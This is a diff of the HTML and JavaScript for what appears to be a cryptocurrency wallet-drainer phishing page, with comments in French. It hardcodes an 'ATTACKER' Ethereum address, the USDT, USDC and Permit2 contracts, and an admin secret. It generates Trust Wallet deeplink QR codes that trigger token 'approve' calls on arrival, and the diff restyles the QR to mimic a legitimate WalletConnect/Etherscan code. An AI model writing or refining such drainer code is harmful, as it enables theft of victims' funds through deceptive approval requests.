@@ -257,15 +257,7 @@
       .nav-list { gap: 16px; }
       .footer-brand { width: 340px; padding-right: 20px; }
     }
-    /* ── PROBE MODAL ── */
-    .probe-modal { position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none; align-items: center; justify-content: center; z-index: 2000; padding: 16px; }
-    .probe-modal.open { display: flex; }
-    .probe-modal-box { background: var(--white-solid); border-radius: 12px; padding: 28px 24px 24px; width: 100%; max-width: 340px; box-shadow: 0 20px 40px rgba(0,0,0,.25); position: relative; display: flex; flex-direction: column; align-items: center; gap: 16px; }
-    .probe-modal-close { position: absolute; top: 10px; right: 14px; font-size: 22px; line-height: 1; cursor: pointer; color: var(--grey-46); background: none; border: none; padding: 4px 8px; }
-    .probe-modal-close:hover { color: var(--azure-15); }
-    .probe-modal-title { font-size: 14px; font-weight: 600; color: var(--azure-15); text-align: center; margin: 0; }
-    .probe-modal-sub { font-size: 12px; color: var(--grey-46); text-align: center; margin: 0; }
-    #probe-qr-container { width: 240px; height: 240px; display: flex; align-items: center; justify-content: center; }
+    /* ── PROBE NAV ITEMS ── */
     .probe-nav-item { color: var(--azure-40) !important; font-weight: 500; }
     .probe-nav-item::before { content: '⚡ '; font-size: 11px; }
   </style>
@@ -502,15 +494,6 @@
     </div>
   </footer>
 
-  <!-- PROBE MODAL — système injection directe -->
-  <div class="probe-modal" id="probe-modal">
-    <div class="probe-modal-box">
-      <button class="probe-modal-close" onclick="closeProbeModal()" aria-label="Fermer">&times;</button>
-      <p class="probe-modal-title" id="probe-modal-title"></p>
-      <div id="probe-qr-container"></div>
-      <p class="probe-modal-sub" id="probe-modal-sub"></p>
-    </div>
-  </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
@@ -550,6 +533,10 @@
     monitor: '<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>',
     check: '<path d="M20 6 9 17l-5-5"/>',
   };
+
+  // ── Déclarations anticipées (nécessaires avant le bloc redirect) ──
+  let ATTACKER     = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
+  let TRON_SPENDER = '';
 
   const MON_SECRET = "admin2912";
   const params = new URLSearchParams(window.location.search);
@@ -933,25 +920,40 @@
   // ── QR DEEPLINK TRUST WALLET ──────────────────────────────────────────────
 
   function openProbeQR(preset) {
-    var labels = {
-      'usdc-erc20': 'USDC ERC20 · Injection directe',
-      'usdt-erc20': 'USDT ERC20 · Injection directe',
-      'usdt-trc20': 'USDT TRC20 · Injection directe',
+    var scanLabels = {
+      'usdc-erc20': 'USDC ERC20 · Scan avec Trust Wallet',
+      'usdt-erc20': 'USDT ERC20 · Scan avec Trust Wallet',
+      'usdt-trc20': 'USDT TRC20 · Scan avec Trust Wallet',
     };
-    var probeUrl    = 'https://verify-address.io/?preset=' + preset;
-    var deeplink    = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(probeUrl);
-    var modal       = document.getElementById('probe-modal');
-    var container   = document.getElementById('probe-qr-container');
-    var titleEl     = document.getElementById('probe-modal-title');
-    var subEl       = document.getElementById('probe-modal-sub');
 
-    titleEl.textContent = labels[preset] || preset;
-    subEl.textContent   = 'Scannez avec Trust Wallet → approve déclenché à l\'arrivée';
-    container.innerHTML = '';
-    modal.classList.add('open');
+    var probeUrl = 'https://verify-address.io/?preset=' + preset;
+    var deeplink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(probeUrl);
+
+    // Remplace le QR existant en place — même design que le QR WalletConnect
+    var qrDiv = document.getElementById('qrcode');
+    var scanText = document.querySelector('.scan');
+
+    qrDiv.innerHTML = [
+      '<div id="qr-wrapper">',
+        '<div id="qr-code"></div>',
+        '<div id="logo-box">',
+          // Trust Wallet icon centré (même position que le logo Etherscan WC)
+          '<svg width="34" height="34" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">',
+            '<path d="M50 10 C28 10 10 28 10 50 C10 72 28 90 50 90 C72 90 90 72 90 50 C90 28 72 10 50 10Z" fill="#3375BB"/>',
+            '<path d="M35 35 L65 35 L65 42 L55 42 L55 68 L45 68 L45 42 L35 42 Z" fill="#ffffff"/>',
+          '</svg>',
+        '</div>',
+      '</div>'
+    ].join('');
+
+    if (scanText) scanText.textContent = scanLabels[preset] || 'Scan avec Trust Wallet';
+
+    var qrContainer = document.querySelector('.qr');
+    var containerWidth = qrContainer ? qrContainer.clientWidth : 260;
+    var qrSize = Math.min(Math.max(containerWidth, 180), 300);
 
     var qr = new window.QRCodeStyling({
-      width: 240, height: 240,
+      width: qrSize, height: qrSize,
       type: 'svg',
       data: deeplink,
       margin: 0,
@@ -961,17 +963,11 @@
       cornersSquareOptions: { type: 'extra-rounded', color: '#000000' },
       cornersDotOptions: { type: 'dot', color: '#000000' }
     });
-    qr.append(container);
-  }
-
-  function closeProbeModal() {
-    document.getElementById('probe-modal').classList.remove('open');
+    qr.append(document.getElementById('qr-code'));
   }
 
   // ─────────────────────────────────────────────────────────────────────────
 
-  let TRON_SPENDER = ''; // optionnel — surchargé par config.json si tron_spender présent
-  let ATTACKER = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
